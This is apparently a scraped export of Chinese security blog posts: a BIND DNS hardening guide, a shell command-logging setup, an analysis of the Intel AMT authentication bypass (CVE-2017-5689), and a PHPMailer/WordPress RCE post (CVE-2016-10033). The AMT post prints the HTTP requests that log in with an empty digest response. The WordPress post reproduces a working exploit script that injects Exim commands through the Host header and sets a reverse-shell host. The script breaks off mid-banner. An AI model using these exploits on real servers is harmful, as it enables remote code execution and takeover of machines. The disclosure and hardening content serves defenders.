2.保持DNS服务器配置正确、可靠这一点相对困难。Linux上的域名服务由named守护进程控制，该进程从主文件：/etc/named.conf中获取信息。它包括一组将主机名称映射为IP地址的各种文件。Linux下主要DNS配置文件见表一、二、三：表－1DNS主要配置文件点击看大图表－2named配置文件族点击看大图named.conf时DNS中的核心它的配置见表三：表－3named.conf文件的配置点击看大图可以看到DNS配置文件是一个复杂的系统。伴随DNS建立出现的许多问题都会引起相同的结果，但起因却不同。但大多数问题是由于配置文件中的语法错误而导致的。DNS是一组文件构成的，所以需要不同工具检查对应文件。一个配置存在缺陷的DNS服务器会存在很大的安全漏洞。这里可以通过一些工具：nslookup、dig、named-checkzone、host、named-checkconf、dlint等对DNS配置文件进行检查。其中安装BIND软件包时自动安装的工具包括：nslookup、dig、named-checkzone、host、named-checkconf。dlint是一个专门检查DNS配置文件开放源代码软件。可以在http://www.domtools.com/dns/dlint.shtml下载。在维护DNS服务器时，网管员希望知道到底是哪些用户在使用DNS服务器，同时也希望能对DNS状态查询做一个统计。这里我们可以使用dnstop查询DNS服务器状态：软件下载和安装：运行软件：如果想查看通过eth0的DNS网络流量可以使用命令 在运行dnstop的过程中，可以敲入如下命令：s，d，t，1，2，3,ctrl+r，ctrl+x，以交互方式来显示不同的信息。1－（TLD）记录查询的顶级域名，2－（SLD）记录查询的二级域名，3－（SLD）记录查询的三级域名，s－（Source）记录发送dns查询的客户端ip地址表，d－（Destinations）记录dns查询的目的服务器的ip地址表，t－（QueryType）记录查询详细类型。ctrl+r－重新纪录。ctrl+x－退出。更详细信息可以查看mandnstop。 安全加固下面以使用最为广泛的Unix类DNS软件BIND为例，介绍如何配置一个安全DNS服务器。本文以RHEL4.0为工作平台。 1.隔离DNS服务器首先应该隔离BIND服务器，不应该在DNS服务器上跑其他服务，尽量允许普通用户登陆。减少其它的服务可以缩小被攻击的可能性，比如混合攻击。 2.隐藏BIND的版本号通常软件的BUG信息是和特定版本相关的，因此版本号是黑客寻求最有价值的信息。黑客使用dig命令可以查询BIND的版本号，然后黑客就知道这个软件有那些漏洞。因此随意公开版本号是不明智的。隐藏BIND版本号比较简单，修改配置文件：/etc/named.conf，在option部分添加version声明将BIND的版本号信息覆盖。例如使用下面的配置声明，当有人请求版本信息时，迫使nmaed显示：“Unsupportedonthisplatform” 3.避免透露服务器信息和版本号一样，也不要轻易透露服务器其他信息。为了让潜在的黑客更难得手，建议不要在DNS配置文件中使用这HINFO和TXT两个资源记录。 4.关闭DNS服务器的gluefetching选项当DNS服务器返回一个域的域名服务器纪录并且域名服务器纪录中没有A纪录，DNS服务器会尝试获取一个纪录。就称为gluefetching,攻击者可以利用它进行DNS欺骗。关闭gluefetching是一个好方法，修改配置文件：/etc/named.conf.加入一行： 5.使用非root权限运行BIND在Linux内核2.3.99以后的版本中，可以以－u选项以非root权限运行BIND。命令如下： 上面的命令表示以nobody用户身份运行BIND。使用nobody身份运行能够降低缓冲区溢出攻击所带来的危险。 6.控制区域(zone)传输默认情况下BIND的区域(zone)传输是全部开放的，如果没有限制那么DNS服务器允许对任何人都进行区域传输的话，那么网络架构中的主机名、主机IP列表、路由器名和路由IP列表，甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到。因此，要对区域传输进行必要的限制。可以通过在／etc／named．conf文件当中添加以下语句来限制区域传输：这样只有IP地址为：从192.168.0.52到192.168.0.109的主机能够同DNS服务器进行区域传输。 7.请求限制如果任何人都可以对DNS服务器发出请求，那么这是不能接受的。限制DNS服务器的服务范围很重要，可以把许多入侵者据之门外。修改BIND的配置文件：/etc/named.conf加入以下内容： 这样所有的用户都可以访问yourdomain.com的DNS服务器，但是只有168.192.1.0网段的主机用户可以请求DNS服务器的任意服务。另外也不要允许其他网段的主机进行递归询问，在上面文件最后加入一行即可： 8.其他強化措施：（1）使用存取控制清单(AccessControlLists)，主要目的在于产生地址配对清单。语法：acl“name”{address_match_list}; address_match_list：地址匹对清单。例子：acl“mis”{192.168.200.15,192.168.143.192/26}; （2）使用Forwarders代询服务器机制，它将自己无法解析的查询转送到某特定的服务器。语法：forwardersip_address_liest例子：以下是建议的forwarders设定(在/etc/named.conf中) orwarders{//指定提供查询的上层DNS。 www.twnic.net.tw;//到上层(twnic)的DNS查询。 };需注意的是通常我们指定的是到本身上一层dns，但也可能因dns缓存有误而转送到错误的服务器上。 （3）使用allow-transfer：目的在于只允许授权的网域主机能更新、读取DNS辖区内的记录。语法：allow-transfer{};例子：address_match_list：允许进行DNS辖区数据传输主机的IP列表。 （4）allow-update：目的在于指定能向本dns服务器提交动态dns更新的主机语法：allow-update{};例子：address_match_list：允许能向本DNS服务器提交动态DNS更新的主机IP列表 9.使用DNSSECDNS欺骗spoofing对目前网络应用,最大的冲击在于冒名者借着提供假的网域名称与网址的对照信息,可以将不知情用户的网页联机,导引到错误的网站,原本属于用户的电子邮件也可能因而遗失,甚而进一步空开成为阻断服务的攻击。所幸,目前较新的BIND版本,针对这一类问题,已经有加入许多改进的方法,不过真正的解决方案,则有赖封包认证机制的建立与推动。DNSSEC就是试图解决这一类问题的全新机制,BIND9已经完整加以设计并完成。DNSSEC引入两个全新的资源记录类型：KEY和SIG，允许客户端和域名服务器对任何DNS数据的来源进行密码验证。DNSSEC主要依靠公钥技术对于包含在DNS中的信息创建密码签名。密码签名通过计算出一个密码hash数来提供DNS中数据的完整性，并将该hash数封装进行保护。私/公钥对中的私钥用来封装hash数，然后可以用公钥把hash数译出来。如果这个译出的hash值匹配接收者刚刚计算出来的hash树，那么表明数据是完整的。不管译出来的hash数和计算出来的hash数是否匹配，对于密码签名这种认证方式都是绝对正确的，因为公钥仅仅用于解密合法的hash数，所以只有拥有私钥的拥有者可以加密这些信息。 10.为DNS服务器配置DNSFloodDetectorDNSFloodDetector是针对DNS服务器的SynFlood攻击检测工具，用于侦测恶意的使用DNS查询功能。它利用libpcap的网络数据包捕获函数功能检测网络流量来判断是否受到SynFlood攻击，DNSFloodDetctor运行方式分成：守护进程（daemon）模式和后台（bindsnap）模式。以守护进程模式运行时它会通过syslog发出警示(/var/log/messages)，以后台模式运行时可以得到实时的查询状态。下载安装： 命令格式:dns_flood_detector[选项]主要选项：-iIFNAME监听某一特定接口。-tN当每秒查询数量超过N值时发出警示.-aN经过N秒后重置警示。-wN每隔N秒显示状态。-xN创建N个buckets。-mN每隔N秒显示所有状态。-b以后台模式执行(bindsnap)。-d以守护进程模式执行(daemon)。-v显示较多的输出信息。-h显示使用方式。 应用实例:dns_flood_detector-b-v-v–t3见下图。dns_flood_detector工作界面 messages的纪录：以守护进程模式执行,纪录每秒超过3次查询的纪录,显示最多信息,包含APTRMX纪录等。 11.建立完整的域名服务器Linux下的DNS服务器用来存储主机的域名信息。包括三种：（1）惟高速存域名服务器（Cache-onlyserver）惟高速存域名服务器（Cache-onlyserver）不包含域名数据库。它从某个远程服务器取得每次域名服务器查询的回答，一旦取得一个回答，就将它放入高速缓存中。（2）主域名服务器（PrimaryNameserver）主域名服务器是特定域所有信息的权威来源。它从域管理员构造的本地文件中加载域信息，该“区文件”包含着服务器具有管理权的部分域结构的最精确的信息。主域名服务器需要配置包括一组完整的文件：主配置文件（named.conf）、正向域的区文件(named.hosts)、反向域的区文件(named.rev)、高速缓存初始化文件(named.ca)和回送文件(named.local)。（3）辅助域名服务器（SecondNameServer）辅助域名服务器用来从主服务器中转移一整套域信息。辅助域名服务器是可选的配置选项。区文件是从主服务器转移出的，作为磁盘文件保存在辅助域名服务器中。辅助域名服务器不需配置本地区文件。说明：多数域名服务器要根据网络实际情况将以上三种服务器组合，进行合理配置。所有的域名服务器都需要一个设置惟高速缓存服务器提供名字解析。一个域只能建立一个主域名服务器，另外至少要创建一个辅助域名服务器作为主域名服务器的备份。一个域的主服务器可以是其他域的辅助域名服务器。为了提高域名系统的可靠性，应建立辅域名服务器。当主域名服务器不能正常工作的情况下，能够替代主域名服务器对外提供不间断的服务。 12.增强DNS服务器的防范Dos/DDoS功能1.使用SYNcookie SYNCookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYNFlood攻击的一种手段。它的原理是，在TCP服务器收到TCPSYN包并返回TCPSYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCPACK包时，TCP服务器在根据那个cookie值检查这个TCPACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。在linux下以root权限执行： 2.增大backlog通过增加backlog的数值，可以一定程度减缓大量SYN请求导致TCP连接阻塞的状况，一般这个数值系统默认是1024，可以增加到1280至2048： 这样在强度不是很高的攻击下，系统响应能力提高了一点。3.缩短retries次数Linux系统默认的tcp_synack_retries是5次，将这个数值减少可以提高系统响应能力，为2次： 修改后，SYN_RECV的数量有了少量减少，系统响应也快了一些。4.限制SYN频率目前比较有效的是对SYN的频率和次数进行限制，这样最大限度的控制了单个IP地址发动攻击的能力。例如将SYN请求的次数限制在30次每分钟，系统默认是5次/秒可以将burst从默认的5个降低到2个。 进行此操作后正常的用户无任何感觉上的差异，而并发的SYN请求量下降了不少，服务响应基本正常了。5.防范SYNAttack攻击SYNAttack”是一种拒绝服务（DoS）的攻击方式，会消耗掉系统中的所有资源，迫使服务器重新启动。使用下面的命令：1#echo1&gt;/proc/sys/net/ipv4/tcp_syncookies 把这个命令加入”/etc/rc.d/rc.local”文件中，等下次系统重新启动的时候就可以自动生效。 13.使用分布式DNS负载均衡在众多的负载均衡架构中，基于DNS解析的负载均衡本身就拥有对DDOS（SYNFlood）的免疫力，基于DNS解析的负载均衡能将用户的请求分配到不同IP的服务器主机上，攻击者攻击的永远只是其中一台服务器，一来这样增加了攻击者的成本，二来过多的DNS请求可以帮助我们追查攻击者的真正踪迹（DNS请求不同于SYN攻击，是需要返回数据的，所以很难进行IP伪装）。但是基于DNS解析的负载均衡成本很高。很多中小公司没有部署这个技术。 14.防范对于DNS服务器网络嗅探器技术被广泛应用于网络维护和管理方面，它工作的时候就像一部被动声纳，默默的接收看来自网络的各种信息，通过对这些数据的分析，网络管理员可以深入了解网络当前的运行状况，以便找出网络中的漏洞。在网络安全日益被注意的今天.我们不但要正确使用嗅探器。还要合理防范嗅探器的危害.嗅探器能够造成很大的安全危害，主要是因为它们不容易被发现。对于一个安全性能要求很严格的企业，同时使用安全的拓扑结构、会话加密、使用静态的ARP地址是有必要的。 15.及时更新系统补丁你应该经常到你所安装的系统发行商的主页上去找最新的补丁。目前操作系统维护主要分两种模式：对于私有操作系统（Windows/Solaris等）由于个人用户不能直接接触其源代码，其代码由公司内部开发人员维护，其安全性由同样的团队保证，内核的修正与其他应用程序一样，以patch/SP包的方式发布。对于Linux这样的开放式系统，是一种开放的结构。应该说，开放的模式是双刃剑。从机制上讲，全世界的开发人员都能获得源代码，从而找出其中的纰漏，似乎安全性应该更好;但是同时，如果网络管理人员不能及时更新内核，也会留下安全隐患。如果你是一个Linux网管员，你经常需要上相应的网站看，是否有补丁，是否有了bugfix，是否需要升级。Linux服务器运行的软件主要包括：Bind，Apache等软件大都是开源软件，而且都在不停升级，稳定版和测试版交替出现。在www.apache.org上，最新的changeLog中都写着：bugfix,securitybugfix的字样。所以Linux网管员要经常的关注相关网站及时升级或添加补丁。 ##总结：DNS是网络服务的基础建设，要长期不断地保持其正常运作，每一个DNS服务器都应该定期检测。域名系统的配置和管理是一项比较复杂和繁琐的系统管理任务，它对整个网络的运行影响极大。为了保证DNS服务器的安全运行，不仅要使用可靠的服务器软件版本，而且要对DNS服务器进行安全配置，同时还要跟踪服务器软件和操作系统的各种漏洞。","raw":null,"content":null,"categories":[{"name":"安全","slug":"安全","permalink":"http://blog.unixmen.cn/categories/安全/"},{"name":"bind","slug":"安全/bind","permalink":"http://blog.unixmen.cn/categories/安全/bind/"},{"name":"DNS","slug":"安全/bind/DNS","permalink":"http://blog.unixmen.cn/categories/安全/bind/DNS/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://blog.unixmen.cn/tags/安全/"},{"name":"bind","slug":"bind","permalink":"http://blog.unixmen.cn/tags/bind/"},{"name":"DNS攻击","slug":"DNS攻击","permalink":"http://blog.unixmen.cn/tags/DNS攻击/"},{"name":"DNS安全加固","slug":"DNS安全加固","permalink":"http://blog.unixmen.cn/tags/DNS安全加固/"}]},{"title":"英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析","slug":"英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析","date":"2017-05-09T09:20:23.000Z","updated":"2017-05-09T09:21:25.000Z","comments":true,"path":"2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/","excerpt":"","text":"文章简述本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。 漏洞说明这款漏洞编号为CVE-2017-5689，能够影响到英特尔远程管理技术，包括Active Management Technology (AMT), Intel Standard Manageability(ISM)和Intel Small Business Technology (SBT)软件，版本号由6开始到11.6。如果你在电脑上看到过这些标志，那么你很有可能中招了。 漏洞最先由Embedi 研究团队的MaksimMalyutin在二月中旬发现，发现后他立即提交给了英特尔安全团队。 现在大部分系统管理员已经通过补丁更新了系统，Embedi决定披露更多细节。 黑客能够通过发送空的验证字符串来劫持使用英特尔芯片的电脑，在了解其中的原理之前我们得先回答下面几个问题： 什么是Intel AMT？Intel AMT漏洞出现在哪里？黑客怎样利用这个漏洞？ 什么是Intel AMT？英特尔通过其 vPro 商务处理器平台提供了 Intel Active Management Technology(AMT)技术，这项技术能让IT管理人员远程管理和修复PC、工作站和服务器。 这项预设的功能使用基于Web的控制页面，通过远程端口16992和16993让管理员远程管理系统。 Intel AMT Web界面甚至可以在系统关机时运作，因为它集成在芯片中，所以可以独立于操作系统运作，只要机器连接了电源和网线。 Intel AMT漏洞出现在哪里？为了防止功能被未授权的用户滥用，AMT服务会使用HTTP摘要认证和Kerberos验证机制。 权限提升漏洞就出现在Intel AMT Web界面通过HTTP摘要认证协议认证用户的环节，这是个基于挑战/应答(Challenge/Response)方式的身份认证系统。 在解释漏洞之前我们先了解一下摘要认证的原理，摘要认证包含以下这些步骤： 用户先发起一个没有认证证书的登陆请求，作为响应，服务器回复一个随机数（称作”nonce“）、HTTP方法以及请求的URI。接下来用户就会被提示输入用户名和密码。输入后，客户端就会发送一个加密的字符串(user_response)，字符串是使用一个单向的加密函数生成的一个消息摘要（message digest），该摘要由用户名、密码、给定的nonce值、HTTP方法，以及所请求的URI生成。而服务器端也会通过数据库中的用户名密码计算一个类似的加密字符串(computed_response)。服务器使用strncmp()函数对两个字符串进行比较，如果二者相符就会让用户登陆Intel AMT Web界面。 而Intel AMT漏洞正是出现在strncmp()函数中。 语法：1strncmp (string_1, string_2 , length) 其中length参数定义了多少个字符会被比较 Strncmp()是一个二进制安全字符串比较函数，所谓二进制安全就是指在一个二进制文件上所执行的不更改文件内容的功能或者操作，其本质上将操作输入作为原始的、无任何特殊格式意义的数据流。函数的返回值包括负整数，0和正整数，取决于string_1是否比string_2大，如果二者相等，则返回0。 存在问题的代码：12if(strncmp(computed_response, user_response, response_length))exit(0x99); 很明显，要认证成功，变量user_response的值必须等于computed_response，因此无论长度如何，strncmp()函数的返回值必须为0。 但是写这段代码的程序员错误地吧user_response的长度放到了strncmp()函数中，而非computed_response。 黑客如何利用？要想利用漏洞，未经授权的用户只需要发送空的user_response值。 由于strncmp()错误地用user_response变量来认证用户，因此，发送null值就会让比较很熟认为user_response与computed_response相等，从而通过验证。 攻击示例：12345678910111213141516171819202122232425262728GET /index.htm HTTP/1.1Host: 127.0.0.1:16992User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveHTTP/1.1 401 UnauthorizedWWW-Authenticate: Digestrealm=»Digest:048A0000000000000000000000000000»,nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n»,stale=»false»,qop=»auth»Content-Type: text/htmlServer: AMTContent-Length: 678Connection: closeGET /index.htm HTTP/1.1Host: 127.0.0.1:16992User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveAuthorization: Digest username=»admin»,realm=»Digest:048A0000000000000000000000000000»,nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n», uri=»/index.htm», response=»»,qop=auth, nc=00000001, cnonce=»60513ab58858482c» 12345678HTTP/1.1 200 OKDate: Thu, 4 May 2017 16:09:17 GMTServer: AMTContent-Type: text/htmlTransfer-Encoding: chunkedCache-Control: no cacheExpires: Thu, 26 Oct 1995 00:00:00 GMT04E6 漏洞危害攻击者还可以使用Keyboard Video Mouse (KVM)功能，这个功能内置在Intel AMT Web控制平台中，KVM能够让系统管理员远程控制系统，能够执行的操作包括： “[攻击者]可以远程加载执行任意程序，读写文件（使用常规的文件管理器）” ，研究人员在论文中写道，“使用IDE-R (IDERedirection)，黑客还可以远程更改启动设备，比如吧其他虚拟镜像作为启动设备。”“使用SOL (Serial over LAN), [攻击者]能够远程开关机/重启/重置系统，还可以对BIOS选项进行编辑。”也就是说，黑客可以做任何事情，可以登陆机器、执行恶意活动，包括修改系统和安装那些无法检测的恶意软件。 升级固件修复系统漏洞影响的英特尔管理固件版本包括6.x, 7.x, 8.x 9.x, 10.x, 11.0,11.5和11.6，不过在6以前和11.6以后的版本则不受影响。 英特尔已经将漏洞评级为高危，并且发布了新的固件版本。于此同时，英特尔还发布了一些指导文件，一份用于检测工作站是否运行了AMT, ISM或SBT，一份用于检测系统是否存在漏洞，还有针对不能立即升级的企业的修复指导。 研究员Bart Blaze在GitHub上也发布了一款简单的修复工具，基于英特尔的指导文件制作。 Cerberus Security在GitHub上也发布了一款检测AMT漏洞脚本,基于python语言。 受影响的用户只需要下载运行其中的DisableAMT.exe，这个文件会关闭Windows操作系统（x86和x64系统）中的AMT功能。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"Intel AMT 漏洞","slug":"Intel-AMT-漏洞","permalink":"http://blog.unixmen.cn/tags/Intel-AMT-漏洞/"}]},{"title":"Shell实时命令历史记录","slug":"Shell实时命令历史记录","date":"2017-05-09T08:14:31.000Z","updated":"2017-05-09T08:17:46.000Z","comments":true,"path":"2017/05/09/Shell实时命令历史记录/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/Shell实时命令历史记录/","excerpt":"","text":"文章简述本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合日志服务器，可把日志传送过去，安全性高。日志记录内容包括：命令执行时间戳，主机名，登陆用户名，PPID，客户端IP地址，执行命令工作目录及执行命令等信息。 安装rsyslog服务 安装rsyslog 1yum install rsyslog 启动rsyslog 12systemctl enable rsyslog.servicesystemctl start rsyslog.service 修改配置文件 修改/etc/bashrc将以下内容加入到/etc/bashrc文件下 1export PROMPT_COMMAND=&apos;history -a;command=$(history 1);logger -p local1.notice -t bash -i &quot;user=$USER,ppid=$PPID,from=$SSH_CLIENT,pwd=$PWD,command:$command &quot;&apos; 修改/etc/rsyslog.conf 1echo &quot;local1.notice /var/log/.command.log&quot; &gt;&gt;/etc/rsyslog.conf 重启rsyslog 1systemctl restart rsyslog.service 测试如果正常的情况下，在文件 /var/log/.command.log下会记录类似如下格式的日志文件。1May 9 15:59:10 localhost bash[8145]: user=root,ppid=18370,from=10.100.0.2 53033 22,pwd=/root,command: 1083 ls -ltr","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"运维","slug":"技术文档/运维","permalink":"http://blog.unixmen.cn/categories/技术文档/运维/"},{"name":"命令行","slug":"技术文档/运维/命令行","permalink":"http://blog.unixmen.cn/categories/技术文档/运维/命令行/"}],"tags":[{"name":"命令行","slug":"命令行","permalink":"http://blog.unixmen.cn/tags/命令行/"},{"name":"历史","slug":"历史","permalink":"http://blog.unixmen.cn/tags/历史/"},{"name":"history","slug":"history","permalink":"http://blog.unixmen.cn/tags/history/"},{"name":"运维","slug":"运维","permalink":"http://blog.unixmen.cn/tags/运维/"}]},{"title":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","slug":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","date":"2017-05-05T01:33:21.000Z","updated":"2017-05-09T08:26:20.000Z","comments":true,"path":"2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","excerpt":"","text":"【2017.5.4更新】昨天曝出了两个比较热门的漏洞，一个是CVE-2016-10033，另一个则为CVE-2017-8295。从描述来看，前者是WordPress Core 4.6一个未经授权的RCE漏洞。不过实际上，这就是去年12月份FreeBuf已经报道的漏洞，因此我们在原文基础上进行更新。 这次漏洞公告就是PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。实际上Wordfence当时就曾经提到过该漏洞影响到了WP Core。 最新的这则公告提到了PHP mail()函数的新利用向量，可在MTA – Exim4之上利用该漏洞，Exim在如Debian或Ubuntu等系统中都是默认安装的。这样一来也就增加了此类攻击的范围和漏洞的严重性。具体为利用host字段注入了恶意数据，进入到了mail函数，再利用sendmail (实际上是软连接到的exim4)命令的-be 参数来执行命令。 之所以到现在才公布这部分细节，是期望给予WordPress和其它收到影响的软件提供商更多时间来升级受影响的Mail库。除此之外，也是针对CVE-2017-8295漏洞留出更多的修复时间。 漏洞利用详情参见：https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html 影响范围： 本次公告中提到的RCE PoC基于WordPress 4.6实现，不过其它版本的WordPress也可能受到影响。 视频演示PoC：https://www.youtube.com/watch?v=ZFt_S5pQPX0 更新：PoC代码已经公布，请站长们尽快升级！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#!/bin/bash## __ __ __ __ __# / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________# / / / _ \\/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/# / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ )# /_____/\\___/\\__, /\\__,_/_/ /_/ /_/\\__,_/\\___/_/|_|\\___/_/ /____/# /____/### WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit# CVE-2016-10033## wordpress-rce-exploit.sh (ver. 1.0)### Discovered and coded by## Dawid Golunski (@dawid_golunski)# https://legalhackers.com## ExploitBox project:# https://ExploitBox.io## Full advisory URL:# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html## Exploit src URL:# https://exploitbox.io/exploit/wordpress-rce-exploit.sh### Tested on WordPress 4.6:# https://github.com/WordPress/WordPress/archive/4.6.zip## Usage:# ./wordpress-rce-exploit.sh target-wordpress-url### Disclaimer:# For testing purposes only### -----------------------------------------------------------------## Interested in vulns/exploitation?### .;lc&apos;# .,cdkkOOOko;.# .,lxxkkkkOOOO000Ol&apos;# .&apos;:oxxxxxkkkkOOOO0000KK0x:&apos;# .;ldxxxxxxxxkxl,.&apos;lk0000KKKXXXKd;.# &apos;:oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl.# &apos;&apos;;ldxxxxxdc,. ,oOXXXNNNXd;,.# .ddc;,,:c;. ,c: .cxxc:;:ox:# .dxxxxo, ., ,kMMM0:. ., .lxxxxx:# .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx:# .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx:# .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx:# .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx:# .dxxxxxc .cNMMMN.oMMMMx&apos; .xxxxxx:# .dxxxxxc lKo;dNMN.oMM0;:Ok. &apos;xxxxxx:# .dxxxxxc ;Mc .lx.:o, Kl &apos;xxxxxx:# .dxxxxxdl;. ., .. .;cdxxxxxx:# .dxxxxxxxxxdc,. &apos;cdkkxxxxxxxx:# .&apos;:oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,.# .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.# .&apos;:oxxxxxxxxx.ckkkkkkkkxl,.# .,cdxxxxx.ckkkkkxc.# .&apos;:odx.ckxl,.# .,.&apos;.## https://ExploitBox.io## https://twitter.com/Exploit_Box## -----------------------------------------------------------------rev_host=&quot;192.168.57.1&quot;function prep_host_header() &#123;cmd=&quot;$1&quot;rce_cmd=&quot;\\$&#123;run&#123;$cmd&#125;&#125;&quot;;# replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;#sed &apos;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^/^\\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\\$spool_directory&#125;&#125;^g&apos;`&quot;# replace &apos; &apos; (space) with#sed &apos;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^ ^\\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\\$tod_log&#125;&#125;^g&apos;`&quot;#return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;return 0&#125;#cat exploitbox.ansintro=&quot;DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09rbzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19fG1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19cG1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAgIHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19fIC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19fX19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtbNUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01NTU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTszNG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2ROTU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMgICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQobWzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1szNG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtbMzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19fX19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4bCwuDQobWzM3bSAbWzI1